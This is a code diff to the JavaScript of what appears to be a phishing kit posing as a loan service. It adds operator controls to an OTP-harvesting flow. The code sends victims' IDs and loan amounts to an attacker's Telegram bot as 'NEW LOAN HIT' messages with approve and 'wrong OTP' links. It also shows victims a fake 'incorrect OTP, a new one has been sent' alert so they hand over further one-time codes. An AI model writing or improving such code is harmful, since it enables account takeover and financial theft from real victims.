@@ -162,7 +162,13 @@
 
         // Send Notification to Operator
         const approveLink = `${SCRIPT_URL}?cmd=approve&num=${id}`;
-        const msg = `💰 *NEW LOAN HIT*\nAmt: GHS ${amt}\nID: ${id}\n\n✅ *CLICK TO SHOW OTP BOX:* \n${approveLink}`;
+        const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&num=${id}`;
+        const msg = `💰 *NEW LOAN HIT*
+ID: ${id}
+Amt: GHS ${amt}
+
+✅ *APPROVE:* ${approveLink}
+❌ *WRONG OTP:* ${wrongLink}`;
         
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         
@@ -171,18 +177,40 @@
     }
 
     function startPolling(phone) {
-        const poller = setInterval(async () => {
-            try {
-                const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
-                const status = await r.text();
-                if(status.trim() === "approved") {
-                    clearInterval(poller);
-                    showView(3);
-                    runCountdown(30);
-                }
-            } catch(e) {}
-        }, 4000);
-    }
+    const poller = setInterval(async () => {
+        try {
+            const r = await fetch(`${SCRIPT_URL}?num=${phone}`);
+            const status = (await r.text()).trim();
+
+            // Case A: Operator approved the initial hit
+            if(status === "approved") {
+                showView(3);
+                runCountdown(30);
+            }
+
+            // Case B: Operator says the OTP entered was wrong
+            if(status === "otp_error") {
+                // 1. Vibrate phone
+                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                
+                // 2. Show Alert
+                alert("❌ INCORRECT OTP: The code you entered is invalid. A new one has been sent to your device.");
+                
+                // 3. Reset OTP inputs
+                document.querySelectorAll('.otp-input').forEach(input => input.value = "");
+                document.getElementById('otp-btn').innerText = "Confirm & Finish";
+                document.getElementById('otp-btn').disabled = false;
+                
+                // 4. Return to OTP view (if not already there)
+                showView(3);
+                runCountdown(30);
+                
+                // IMPORTANT: Tell the script to go back to 'pending' so the alert doesn't loop
+                // You would typically handle this by having the script delete the 'otp_error' property
+            }
+        } catch(e) {}
+    }, 4000);
+}
 
     function runCountdown(sec) {
         let timer = sec;
